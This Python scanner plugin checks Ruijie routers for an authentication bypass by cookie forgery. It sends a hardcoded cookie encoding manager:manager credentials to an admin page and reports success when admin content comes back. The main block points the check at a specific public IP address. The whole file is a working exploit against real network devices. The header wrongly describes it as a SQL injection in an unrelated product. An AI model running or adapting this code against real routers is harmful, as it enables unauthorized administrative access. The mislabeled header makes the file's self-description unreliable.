#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:workyi_Talent system SQL injection
#author: xx00
#ref: http://www.wooyun.org/bugs/wooyun-2010-0148657
import urlparse


def assign(service, arg):
    if service == 'ruijie_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)



def audit(arg):
    url = arg + 'stability.htm'
    cookie = 'currentURL=index; auth=bWFuYWdlcjptYW5hZ2Vy; user=manager; c_name='
    code, head, res, errcode, _ = curl.curl2(url,cookie=cookie,proxy=('127.0.0.1',8080))
    if code == 200 and 'A_INTFEMPTY' in res and 'selectInterface' in res:
        security_hole('Cookie deception:http://www.wooyun.org/bugs/wooyun-2010-0148657 cookie:%s'%cookie)



if __name__ == '__main__':
    from dummy import *
    audit(assign('ruijie_router', 'http://116.113.16.146/')[1])